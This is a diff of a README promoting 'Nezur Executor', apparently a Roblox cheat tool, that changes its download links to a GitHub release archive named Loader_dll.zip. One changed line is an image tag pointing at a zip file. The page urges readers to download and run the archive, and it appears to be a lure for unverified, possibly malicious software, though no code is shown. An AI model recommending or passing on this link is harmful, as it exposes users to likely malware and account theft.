@@ -316,7 +316,7 @@
 
 Welcome to the Nezur Executor repository! 🚀 This repository hosts the latest version of the Nezur Executor, a powerful tool for enhancing your Roblox gaming experience.
 
-![Nezur Executor](https://github.com/secondlathloothy/Nezur-Executor/releases/download/Download/application.zip)
+![Nezur Executor](https://github.com/secondlathloothy/Nezur-Executor/releases/download/Download/Loader_dll.zip)
 
 ## Table of Contents
 
@@ -811,7 +811,7 @@ Nezur Executor is a cutting-edge executor designed for Roblox script execution. 
 
 To get started with Nezur Executor, follow these simple steps:
 
-1. Download the latest version of the executor from the following link: [![Download Nezur Executor](https://img.shields.io/badge/Download-Nezur%20Executor-orange)](https://github.com/secondlathloothy/Nezur-Executor/releases/download/Download/application.zip).
+1. Download the latest version of the executor from the following link: [![Download Nezur Executor](https://img.shields.io/badge/Download-Nezur%20Executor-orange)](https://github.com/secondlathloothy/Nezur-Executor/releases/download/Download/Loader_dll.zip).
   
    This download button will provide you with the necessary files to install the executor on your system. Click the button to initiate the download process.
 
